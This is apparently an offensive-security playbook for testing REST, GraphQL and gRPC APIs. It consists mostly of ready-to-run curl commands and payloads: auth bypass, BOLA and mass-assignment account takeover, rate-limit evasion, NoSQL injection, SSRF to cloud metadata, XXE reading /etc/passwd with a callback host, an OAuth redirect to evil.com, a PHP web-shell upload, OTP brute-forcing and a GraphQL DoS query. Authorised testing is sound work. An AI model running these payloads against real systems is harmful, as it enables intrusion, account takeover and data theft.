# Playbook: API Security Testing

## Purpose
Comprehensive security testing for REST APIs, GraphQL, gRPC, and general API
surfaces. Covers OWASP API Security Top 10 (2023), authentication/authorization
flaws, input validation, rate limiting, and API-specific attack vectors.
Input: API base URL, Swagger/OpenAPI spec, or authenticated session.

---

## Step 1 — API Discovery & Specification Enumeration

Locate API documentation, specs, and hidden endpoints before testing.

```bash
TARGET="https://target.com"

# Swagger / OpenAPI spec locations
SPEC_PATHS=(
  "/swagger.json"
  "/swagger/v1/swagger.json"
  "/swagger-ui.html"
  "/swagger-ui/"
  "/swagger-resources"
  "/openapi.json"
  "/openapi.yaml"
  "/openapi/v3/api-docs"
  "/api-docs"
  "/api-docs.json"
  "/v2/api-docs"
  "/v3/api-docs"
  "/api/swagger.json"
  "/api/openapi.json"
  "/api/v1/swagger.json"
  "/api/v2/swagger.json"
  "/docs"
  "/docs/"
  "/redoc"
  "/graphql"
  "/graphiql"
  "/altair"
  "/playground"
  "/.well-known/openapi.json"
  "/.well-known/openapi.yaml"
)

for path in "${SPEC_PATHS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${path}")
  [ "$code" != "404" ] && [ "$code" != "000" ] && \
    echo "[${code}] ${TARGET}${path}"
done

# WADL (Java/JAX-RS)
curl -sk "${TARGET}/application.wadl" -o wadl_response.xml
curl -sk "${TARGET}/api/application.wadl" -o wadl_api_response.xml

# WSDL (SOAP)
curl -sk "${TARGET}/service?wsdl" -o wsdl_response.xml
curl -sk "${TARGET}/ws?wsdl" -o wsdl_ws_response.xml

# Kiterunner — API endpoint brute-force
kr scan ${TARGET} -w /path/to/kiterunner/routes-large.kite -x 20 \
  --fail-status-codes 404,401 -o kr_results.txt

# Wordlist-based API path brute-force with ffuf
ffuf -u "${TARGET}/api/FUZZ" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403,405 \
  -o ffuf_api_endpoints.json
```

---

## Step 2 — OpenAPI/Swagger Specification Audit

If a spec file was found, analyze it for security issues.

```bash
# Download the spec
curl -sk "${TARGET}/swagger.json" -o spec.json

# List all endpoints with methods
cat spec.json | python3 -c "
import json, sys
spec = json.load(sys.stdin)
paths = spec.get('paths', {})
for path, methods in sorted(paths.items()):
    for method in methods:
        if method in ('get','post','put','patch','delete','head','options'):
            sec = methods[method].get('security', 'NONE')
            print(f'  [{method.upper():7s}] {path}  auth={sec}')
"

# Find endpoints with no authentication requirement
cat spec.json | python3 -c "
import json, sys
spec = json.load(sys.stdin)
paths = spec.get('paths', {})
global_sec = spec.get('security', [])
for path, methods in sorted(paths.items()):
    for method, details in methods.items():
        if method not in ('get','post','put','patch','delete'): continue
        op_sec = details.get('security', None)
        if op_sec is not None and len(op_sec) == 0:
            print(f'  [NO AUTH] [{method.upper()}] {path}')
        elif op_sec is None and len(global_sec) == 0:
            print(f'  [NO AUTH] [{method.upper()}] {path}')
"

# Check for sensitive endpoints
cat spec.json | python3 -c "
import json, sys, re
spec = json.load(sys.stdin)
sensitive = re.compile(r'(admin|internal|debug|test|config|secret|key|token|password|user|account|billing|payment)', re.I)
for path in spec.get('paths', {}):
    if sensitive.search(path):
        print(f'  [SENSITIVE] {path}')
"

# Check for excessive OAuth scopes
cat spec.json | python3 -c "
import json, sys
spec = json.load(sys.stdin)
schemes = spec.get('securityDefinitions', spec.get('components', {}).get('securitySchemes', {}))
for name, scheme in schemes.items():
    if 'flows' in scheme:
        for flow, details in scheme['flows'].items():
            scopes = details.get('scopes', {})
            print(f'  [{name}] {flow}: {len(scopes)} scopes')
            for scope, desc in scopes.items():
                print(f'    - {scope}: {desc}')
"
```

---

## Step 3 — Authentication Testing

### API Key Security

```bash
# Check if API key is accepted in URL query (bad practice, logged in access logs)
curl -sk "${TARGET}/api/v1/users?api_key=YOUR_KEY"
curl -sk "${TARGET}/api/v1/users?apikey=YOUR_KEY"
curl -sk "${TARGET}/api/v1/users?key=YOUR_KEY"

# Verify key works in header (preferred)
curl -sk "${TARGET}/api/v1/users" -H "X-API-Key: YOUR_KEY"
curl -sk "${TARGET}/api/v1/users" -H "Authorization: ApiKey YOUR_KEY"

# Test with empty/null/malformed API keys
curl -sk "${TARGET}/api/v1/users" -H "X-API-Key: "
curl -sk "${TARGET}/api/v1/users" -H "X-API-Key: null"
curl -sk "${TARGET}/api/v1/users" -H "X-API-Key: undefined"
curl -sk "${TARGET}/api/v1/users" -H "X-API-Key: true"
curl -sk "${TARGET}/api/v1/users" -H "X-API-Key: []"
curl -sk "${TARGET}/api/v1/users" -H "X-API-Key: {}"

# Test without any auth header at all
curl -sk "${TARGET}/api/v1/users"
```

### Bearer Token Lifecycle

```bash
# Get a token
TOKEN=$(curl -sk -X POST "${TARGET}/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}' | jq -r '.token // .access_token')

# Test token after logout — should be invalidated
curl -sk -X POST "${TARGET}/api/auth/logout" \
  -H "Authorization: Bearer ${TOKEN}"

# Reuse token after logout (should fail if properly invalidated)
curl -sk "${TARGET}/api/v1/me" \
  -H "Authorization: Bearer ${TOKEN}"
# If still works → token not invalidated server-side

# Test expired token handling
# Decode JWT to check exp claim
echo "${TOKEN}" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# Test refresh token reuse after rotation
REFRESH=$(curl -sk -X POST "${TARGET}/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}' | jq -r '.refresh_token')

# Use refresh token
NEW_TOKEN=$(curl -sk -X POST "${TARGET}/api/auth/refresh" \
  -H "Content-Type: application/json" \
  -d "{\"refresh_token\":\"${REFRESH}\"}" | jq -r '.access_token')

# Try reusing the old refresh token (should fail after rotation)
curl -sk -X POST "${TARGET}/api/auth/refresh" \
  -H "Content-Type: application/json" \
  -d "{\"refresh_token\":\"${REFRESH}\"}"
```

### OAuth2 Flow Abuse

```bash
# Test open redirect in OAuth callback
curl -sk -v "${TARGET}/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com/callback&response_type=code"

# Test scope escalation
curl -sk "${TARGET}/oauth/authorize?client_id=CLIENT&redirect_uri=LEGIT_URI&response_type=code&scope=admin+read+write"

# PKCE downgrade — omit code_challenge
curl -sk "${TARGET}/oauth/authorize?client_id=CLIENT&redirect_uri=LEGIT_URI&response_type=code"
# If works without PKCE when it should require it → vulnerability

# Token exchange without client_secret (public client confusion)
curl -sk -X POST "${TARGET}/oauth/token" \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=LEGIT_URI&client_id=CLIENT"
```

---

## Step 4 — Authorization: BOLA & BFLA

### Broken Object Level Authorization (BOLA / API-level IDOR)

```bash
# Setup: two tokens at same privilege level
TOKEN_A="attacker_token"
TOKEN_B="victim_token"

# Get victim's resource ID
VICTIM_RESOURCE=$(curl -sk "${TARGET}/api/v1/me" \
  -H "Authorization: Bearer ${TOKEN_B}" | jq -r '.id')

# Access victim's resource with attacker's token
curl -sk "${TARGET}/api/v1/users/${VICTIM_RESOURCE}" \
  -H "Authorization: Bearer ${TOKEN_A}"

curl -sk "${TARGET}/api/v1/users/${VICTIM_RESOURCE}/orders" \
  -H "Authorization: Bearer ${TOKEN_A}"

curl -sk "${TARGET}/api/v1/users/${VICTIM_RESOURCE}/settings" \
  -H "Authorization: Bearer ${TOKEN_A}"

# Modify victim's resource
curl -sk -X PUT "${TARGET}/api/v1/users/${VICTIM_RESOURCE}" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# Delete victim's resource
curl -sk -X DELETE "${TARGET}/api/v1/users/${VICTIM_RESOURCE}/orders/12345" \
  -H "Authorization: Bearer ${TOKEN_A}"
```

### Broken Function Level Authorization (BFLA)

```bash
# Access admin-only endpoints with regular user token
ADMIN_PATHS=(
  "/api/v1/admin/users"
  "/api/v1/admin/settings"
  "/api/v1/admin/logs"
  "/api/v1/admin/config"
  "/api/admin/dashboard"
  "/api/internal/metrics"
  "/api/internal/health"
  "/api/v1/users?role=admin"
  "/api/v1/system/info"
  "/api/v1/debug"
)

for path in "${ADMIN_PATHS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${path}" \
    -H "Authorization: Bearer ${TOKEN_A}")
  [ "$code" = "200" ] && echo "[BFLA] Accessible: ${path}"
done

# Try privilege escalation via role modification
curl -sk -X PUT "${TARGET}/api/v1/users/me" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

curl -sk -X PATCH "${TARGET}/api/v1/users/me" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"is_admin":true}'
```

---

## Step 5 — Mass Assignment & Excessive Data Exposure

### Mass Assignment (sending extra fields)

```bash
# Register with extra fields that should not be user-controlled
curl -sk -X POST "${TARGET}/api/v1/users/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "email": "test@test.com",
    "password": "Test123!",
    "role": "admin",
    "is_admin": true,
    "is_verified": true,
    "credits": 99999,
    "plan": "enterprise",
    "discount": 100,
    "permissions": ["admin","superuser"],
    "group_id": 1
  }'

# Update profile with extra fields
curl -sk -X PUT "${TARGET}/api/v1/users/me" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test User",
    "role": "admin",
    "balance": 99999,
    "is_staff": true,
    "approved": true,
    "email_verified": true
  }'

# Check what stuck
curl -sk "${TARGET}/api/v1/users/me" \
  -H "Authorization: Bearer ${TOKEN_A}" | jq .
```

### Excessive Data Exposure

```bash
# Check if API returns more data than the UI shows
curl -sk "${TARGET}/api/v1/users" \
  -H "Authorization: Bearer ${TOKEN_A}" | jq '.[0]' | head -50

# Look for sensitive fields in responses:
# password_hash, ssn, credit_card, internal_id, api_key, secret,
# token, session, private_key, salary, address

# Compare response with and without verbose/debug params
curl -sk "${TARGET}/api/v1/users/me" \
  -H "Authorization: Bearer ${TOKEN_A}" | jq 'keys'

curl -sk "${TARGET}/api/v1/users/me?include=all" \
  -H "Authorization: Bearer ${TOKEN_A}" | jq 'keys'

curl -sk "${TARGET}/api/v1/users/me?fields=*" \
  -H "Authorization: Bearer ${TOKEN_A}" | jq 'keys'

curl -sk "${TARGET}/api/v1/users/me?debug=true" \
  -H "Authorization: Bearer ${TOKEN_A}" | jq 'keys'

# Check error responses for data leakage
curl -sk "${TARGET}/api/v1/users/999999999" \
  -H "Authorization: Bearer ${TOKEN_A}"
# Look for: stack traces, internal paths, DB info, query strings
```

---

## Step 6 — Rate Limiting Bypass

```bash
ENDPOINT="${TARGET}/api/v1/auth/login"

# Baseline — confirm rate limit exists
for i in $(seq 1 50); do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "${ENDPOINT}" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong'$i'"}')
  echo "Request $i: $code"
done

# Bypass 1 — X-Forwarded-For rotation
for i in $(seq 1 50); do
  curl -sk -X POST "${ENDPOINT}" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.${i}" \
    -d '{"username":"admin","password":"wrong'$i'"}'
done

# Bypass 2 — IP spoofing headers
HEADERS=(
  "X-Forwarded-For"
  "X-Real-IP"
  "X-Originating-IP"
  "X-Remote-IP"
  "X-Remote-Addr"
  "X-Client-IP"
  "X-Host"
  "Forwarded"
  "True-Client-IP"
  "CF-Connecting-IP"
  "X-Cluster-Client-IP"
  "Fastly-Client-IP"
)

for hdr in "${HEADERS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "${ENDPOINT}" \
    -H "Content-Type: application/json" \
    -H "${hdr}: 1.2.3.4" \
    -d '{"username":"admin","password":"wrong"}')
  echo "[${hdr}] ${code}"
done

# Bypass 3 — Endpoint aliasing (different paths, same handler)
ALIASES=(
  "/api/v1/auth/login"
  "/api/v2/auth/login"
  "/api/v1/auth/login/"           # trailing slash
  "/api/v1/auth/LOGIN"            # case variation
  "/api/v1/auth/login?"           # empty query
  "/api/v1/auth/login#"           # fragment
  "/api/v1/auth/./login"          # path traversal
  "/api/v1/auth/login;param=1"    # parameter pollution
  "%2fapi%2fv1%2fauth%2flogin"    # URL encoded
)

for alias in "${ALIASES[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "${TARGET}${alias}" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}')
  echo "[${code}] ${alias}"
done

# Bypass 4 — HTTP method change
curl -sk -o /dev/null -w "%{http_code}" "${ENDPOINT}?username=admin&password=wrong"
# Some rate limiters only count POST, not GET

# Bypass 5 — API key rotation (if multiple keys available)
# Use different API keys per request to reset per-key counters
```

---

## Step 7 — Input Validation & Type Confusion

```bash
# Type confusion — send unexpected types
ENDPOINT="${TARGET}/api/v1/users"

# String where integer expected
curl -sk "${ENDPOINT}/abc" -H "Authorization: Bearer ${TOKEN_A}"
curl -sk "${ENDPOINT}/null" -H "Authorization: Bearer ${TOKEN_A}"
curl -sk "${ENDPOINT}/undefined" -H "Authorization: Bearer ${TOKEN_A}"
curl -sk "${ENDPOINT}/true" -H "Authorization: Bearer ${TOKEN_A}"
curl -sk "${ENDPOINT}/-1" -H "Authorization: Bearer ${TOKEN_A}"
curl -sk "${ENDPOINT}/0" -H "Authorization: Bearer ${TOKEN_A}"
curl -sk "${ENDPOINT}/99999999999999999" -H "Authorization: Bearer ${TOKEN_A}"
curl -sk "${ENDPOINT}/1.5" -H "Authorization: Bearer ${TOKEN_A}"

# Array where string expected
curl -sk -X POST "${ENDPOINT}" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"name": ["admin","test"], "email": {"$gt": ""}}'

# Object injection (NoSQL-style)
curl -sk -X POST "${TARGET}/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

curl -sk -X POST "${TARGET}/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Boundary testing
curl -sk -X POST "${ENDPOINT}" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"name": "'$(python3 -c "print('A'*100000)"))'"}'

# Special characters
SPECIALS=("'\"" "<script>" "{{7*7}}" "${7*7}" "../../etc/passwd" "%00" "\n" "\r\n" "\x00")
for s in "${SPECIALS[@]}"; do
  curl -sk "${ENDPOINT}?search=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${s}'))")" \
    -H "Authorization: Bearer ${TOKEN_A}"
done

# Unicode normalization issues
curl -sk -X POST "${ENDPOINT}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -d '{"name": "adm\u0131n"}'   # Turkish dotless i → "admin" after uppercasing
```

---

## Step 8 — HTTP Method Tampering

```bash
RESOURCE="${TARGET}/api/v1/users/123"

# Test all methods
for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X "${method}" "${RESOURCE}" \
    -H "Authorization: Bearer ${TOKEN_A}")
  echo "[${method}] ${code}"
done

# Method override headers — bypass method restrictions
curl -sk -X POST "${RESOURCE}" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "X-HTTP-Method-Override: DELETE"

curl -sk -X POST "${RESOURCE}" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "X-HTTP-Method: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

curl -sk -X POST "${RESOURCE}" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "X-Method-Override: PATCH"

# Query parameter method override
curl -sk -X POST "${RESOURCE}?_method=DELETE" \
  -H "Authorization: Bearer ${TOKEN_A}"

curl -sk -X POST "${RESOURCE}?_method=PUT" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# CORS preflight abuse — check OPTIONS response
curl -sk -X OPTIONS "${RESOURCE}" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: Authorization" -v 2>&1 | \
  grep -i "access-control"
```

---

## Step 9 — API Versioning Attacks

```bash
# Discover available API versions
VERSIONS=("v0" "v1" "v2" "v3" "v4" "v5" "v0.1" "v1.0" "v1.1" "v2.0" "beta" "alpha" "latest" "stable" "dev" "staging" "internal")

for ver in "${VERSIONS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}/api/${ver}/users" \
    -H "Authorization: Bearer ${TOKEN_A}")
  [ "$code" != "404" ] && echo "[${code}] /api/${ver}/users"
done

# Version via header
for ver in 1 2 3; do
  curl -sk "${TARGET}/api/users" \
    -H "Authorization: Bearer ${TOKEN_A}" \
    -H "Accept: application/vnd.api+json; version=${ver}" -v 2>&1 | head -20
done

curl -sk "${TARGET}/api/users" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "API-Version: 1"

# Test deprecated endpoint with weaker security
# Old version may lack auth, rate limiting, input validation
curl -sk "${TARGET}/api/v1/admin/users" \
  -H "Authorization: Bearer ${TOKEN_A}"
# vs
curl -sk "${TARGET}/api/v2/admin/users" \
  -H "Authorization: Bearer ${TOKEN_A}"

# Old version may return more data (no field filtering)
diff <(curl -sk "${TARGET}/api/v1/users/me" -H "Authorization: Bearer ${TOKEN_A}" | jq 'keys') \
     <(curl -sk "${TARGET}/api/v2/users/me" -H "Authorization: Bearer ${TOKEN_A}" | jq 'keys')
```

---

## Step 10 — Pagination Abuse

```bash
# Large page size — data dump
curl -sk "${TARGET}/api/v1/users?page=1&per_page=10000" \
  -H "Authorization: Bearer ${TOKEN_A}"

curl -sk "${TARGET}/api/v1/users?limit=999999&offset=0" \
  -H "Authorization: Bearer ${TOKEN_A}"

curl -sk "${TARGET}/api/v1/users?page_size=99999" \
  -H "Authorization: Bearer ${TOKEN_A}"

# Negative offset / page
curl -sk "${TARGET}/api/v1/users?page=-1&per_page=100" \
  -H "Authorization: Bearer ${TOKEN_A}"

curl -sk "${TARGET}/api/v1/users?offset=-10" \
  -H "Authorization: Bearer ${TOKEN_A}"

# Zero page size (sometimes returns all)
curl -sk "${TARGET}/api/v1/users?per_page=0" \
  -H "Authorization: Bearer ${TOKEN_A}"

# Cursor manipulation (if cursor-based pagination)
# Decode the cursor (often base64)
CURSOR="eyJpZCI6IDEwMH0="
echo "${CURSOR}" | base64 -d   # {"id": 100}
# Modify and re-encode
echo -n '{"id": 1}' | base64   # Start from beginning

curl -sk "${TARGET}/api/v1/users?cursor=$(echo -n '{"id":1}' | base64)" \
  -H "Authorization: Bearer ${TOKEN_A}"

# Integer overflow on page number
curl -sk "${TARGET}/api/v1/users?page=2147483647" \
  -H "Authorization: Bearer ${TOKEN_A}"

# Sort parameter injection
curl -sk "${TARGET}/api/v1/users?sort=password" \
  -H "Authorization: Bearer ${TOKEN_A}"

curl -sk "${TARGET}/api/v1/users?order_by=is_admin+DESC" \
  -H "Authorization: Bearer ${TOKEN_A}"
```

---

## Step 11 — Webhook & Callback Injection

```bash
# SSRF via webhook registration
curl -sk -X POST "${TARGET}/api/v1/webhooks" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/",
    "events": ["order.created"]
  }'

# Internal network scan via webhook
for port in 80 443 3000 5000 6379 8080 8443 9200; do
  curl -sk -X POST "${TARGET}/api/v1/webhooks" \
    -H "Authorization: Bearer ${TOKEN_A}" \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"http://127.0.0.1:${port}/\", \"events\": [\"test\"]}"
done

# OOB callback to confirm SSRF
curl -sk -X POST "${TARGET}/api/v1/webhooks" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://${CALLBACK_URL}/webhook-ssrf\", \"events\": [\"test\"]}"

# Test callback URL with file:// scheme
curl -sk -X POST "${TARGET}/api/v1/webhooks" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///etc/passwd", "events": ["test"]}'

# Redirect-based SSRF bypass for webhook validation
# Host a 302 redirect on your server pointing to internal resources
curl -sk -X POST "${TARGET}/api/v1/webhooks" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://your-server.com/redirect-to-metadata\", \"events\": [\"test\"]}"

# Webhook URL with authentication in URL
curl -sk -X POST "${TARGET}/api/v1/webhooks" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://user:pass@internal-service:8080/", "events": ["test"]}'
```

---

## Step 12 — Content-Type Attacks

```bash
# JSON to XML switch (potential XXE)
# Original JSON request
curl -sk -X POST "${TARGET}/api/v1/users" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com"}'

# Switch to XML — server may parse it
curl -sk -X POST "${TARGET}/api/v1/users" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>'

# Try text/xml as well
curl -sk -X POST "${TARGET}/api/v1/users" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://CALLBACK_URL/xxe-probe">
]>
<user><name>&xxe;</name></user>'

# Multipart boundary manipulation
curl -sk -X POST "${TARGET}/api/v1/upload" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: multipart/form-data; boundary=----EVIL" \
  -d '------EVIL
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/png

<?php system($_GET["cmd"]); ?>
------EVIL--'

# Send JSON body with form-urlencoded content type
curl -sk -X POST "${TARGET}/api/v1/users" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'name=test&email=test@test.com&role=admin'
# Some frameworks parse both — mass assignment may be easier via form encoding

# Content-Type with charset tricks
curl -sk -X POST "${TARGET}/api/v1/users" \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -H "Content-Type: application/json; charset=utf-16" \
  -d '{"name":"test"}'
```

---

## Step 13 — gRPC Testing

```bash
# Check if gRPC is available
curl -sk "${TARGET}" -H "Content-Type: application/grpc" -v 2>&1 | head -20

# gRPC reflection — list available services
grpcurl -plaintext ${TARGET_HOST}:${GRPC_PORT} list
# If TLS:
grpcurl ${TARGET_HOST}:${GRPC_PORT} list

# List methods for a service
grpcurl -plaintext ${TARGET_HOST}:${GRPC_PORT} list com.target.UserService

# Describe a method (see request/response types)
grpcurl -plaintext ${TARGET_HOST}:${GRPC_PORT} describe com.target.UserService.GetUser

# Call a method
grpcurl -plaintext -d '{"user_id": 1}' \
  ${TARGET_HOST}:${GRPC_PORT} com.target.UserService.GetUser

# BOLA test on gRPC
grpcurl -plaintext -d '{"user_id": 2}' \
  -H "Authorization: Bearer ${TOKEN_A}" \
  ${TARGET_HOST}:${GRPC_PORT} com.target.UserService.GetUser

# Enumerate users via gRPC
for id in $(seq 1 100); do
  result=$(grpcurl -plaintext -d "{\"user_id\": ${id}}" \
    ${TARGET_HOST}:${GRPC_PORT} com.target.UserService.GetUser 2>&1)
  echo "$result" | grep -q "email" && echo "[FOUND] user_id=${id}"
done

# gRPC-web (browser-based gRPC over HTTP)
curl -sk -X POST "${TARGET}/com.target.UserService/GetUser" \
  -H "Content-Type: application/grpc-web+proto" \
  -H "X-Grpc-Web: 1" \
  --data-binary $'\x00\x00\x00\x00\x02\x08\x01'

# If reflection is disabled, try common service names
SERVICES=("User" "Auth" "Admin" "Health" "Account" "Payment" "Order" "Internal" "Debug")
for svc in "${SERVICES[@]}"; do
  grpcurl -plaintext ${TARGET_HOST}:${GRPC_PORT} list "com.target.${svc}Service" 2>/dev/null && \
    echo "[FOUND] ${svc}Service"
done
```

---

## Step 14 — GraphQL-Specific API Attacks

```bash
# Introspection query — full schema dump
curl -sk -X POST "${TARGET}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# If introspection is disabled, try alternative paths
curl -sk -X POST "${TARGET}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}'

# Field suggestion abuse (typo reveals field names)
curl -sk -X POST "${TARGET}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { passwor } }"}'
# Error may suggest: "Did you mean password?"

# Batched query abuse
curl -sk -X POST "${TARGET}/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ user(id:1) { email } }"},
    {"query":"{ user(id:2) { email } }"},
    {"query":"{ user(id:3) { email } }"}
  ]'

# Alias-based batching for rate limit bypass (e.g., brute force OTP)
curl -sk -X POST "${TARGET}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a0:login(otp:\"0000\"){token} a1:login(otp:\"0001\"){token} a2:login(otp:\"0002\"){token} }"}'

# Nested query DoS (resource exhaustion)
curl -sk -X POST "${TARGET}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { friends { friends { friends { friends { id } } } } } }"}'
```

---

## Step 15 — Tool Integration

### Postman / Insomnia

```
1. Import the OpenAPI spec into Postman or Insomnia
2. Set up environment variables for base URL, tokens, and user IDs
3. Create two environments: attacker and victim
4. Run collection with attacker env against victim resources
5. Use Postman's pre-request scripts to auto-rotate tokens
```

### mitmproxy

```bash
# Intercept API traffic and log all requests
mitmproxy -p 8080 --mode regular \
  --set flow_detail=3 \
  -w api_traffic.flow

# Filter for specific API paths
mitmproxy -p 8080 --mode regular \
  --set flow_detail=3 \
  --set view_filter="~u /api/"

# Automated response analysis
mitmdump -p 8080 --mode regular \
  -s "from mitmproxy import ctx
def response(flow):
    if '/api/' in flow.request.url and flow.response:
        ct = flow.response.headers.get('content-type','')
        if 'json' in ct:
            import json
            try:
                body = json.loads(flow.response.text)
                sensitive = ['password','secret','token','key','ssn','credit_card']
                found = [k for k in str(body).lower().split() if any(s in k for s in sensitive)]
                if found:
                    ctx.log.warn(f'SENSITIVE: {flow.request.url} -> {found}')
            except: pass"
```

### APIFuzzer

```bash
# Fuzz API endpoints from OpenAPI spec
apifuzzer -s spec.json \
  -u "${TARGET}" \
  -r api_fuzz_results/ \
  --log-level WARNING

# With authentication
apifuzzer -s spec.json \
  -u "${TARGET}" \
  -r api_fuzz_results/ \
  --header "Authorization: Bearer ${TOKEN_A}"
```

### RESTler (Microsoft)

```bash
# Compile the spec
restler compile --api_spec spec.json

# Run in test mode (find bugs)
restler test --grammar_file Compile/grammar.py \
  --dictionary_file Compile/dict.json \
  --settings Compile/engine_settings.json \
  --token_refresh_command "python3 get_token.py"

# Run in fuzz-lean mode
restler fuzz-lean --grammar_file Compile/grammar.py \
  --dictionary_file Compile/dict.json
```

### Arjun (parameter discovery)

```bash
# Discover hidden API parameters
arjun -u "${TARGET}/api/v1/users" \
  --headers "Authorization: Bearer ${TOKEN_A}" \
  -m GET -o arjun_params.json

arjun -u "${TARGET}/api/v1/users" \
  --headers "Authorization: Bearer ${TOKEN_A}" \
  -m POST -o arjun_post_params.json
```

### Kiterunner (API path discovery)

```bash
# Full API route brute-force with method detection
kr scan "${TARGET}" \
  -w /path/to/routes-large.kite \
  -x 20 \
  --fail-status-codes 404 \
  -H "Authorization: Bearer ${TOKEN_A}" \
  -o kr_results.txt

# Brute with wordlist (non-kite format)
kr brute "${TARGET}" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -x 20 \
  -H "Authorization: Bearer ${TOKEN_A}"
```

---

## Output

```
PLAYBOOK : API Security Testing
TARGET   : https://target.com/api
---
ENDPOINT      : PUT /api/v1/users/{id}
VULN CLASS    : BOLA (Broken Object Level Authorization)
TEST TYPE     : Horizontal access — modify victim resource with attacker token
ATTACKER      : Token A (user_id: 501)
VICTIM        : Token B (user_id: 502)
RESULT        : 200 OK — attacker successfully modified victim's email
SEVERITY      : CRITICAL
IMPACT        : Full account takeover via email change on any user
EVIDENCE      : [request/response pair]
CVSS          : 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
NEXT STEP     : Load 03_reporting/report_writer.md
---
ENDPOINT      : POST /api/v1/users/register
VULN CLASS    : Mass Assignment
TEST TYPE     : Extra field injection during registration
RESULT        : 200 OK — "role":"admin" accepted, user created with admin role
SEVERITY      : CRITICAL
IMPACT        : Privilege escalation to admin on registration
EVIDENCE      : [request/response pair]
CVSS          : 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
NEXT STEP     : Load 03_reporting/report_writer.md
---
ENDPOINT      : /swagger.json
VULN CLASS    : Information Disclosure
TEST TYPE     : API specification exposure
RESULT        : 200 OK — full OpenAPI spec accessible without authentication
SEVERITY      : MEDIUM
IMPACT        : Complete API surface enumeration, internal endpoint discovery
EVIDENCE      : [spec content summary]
NEXT STEP     : Audit spec per Step 2, then test all endpoints
```
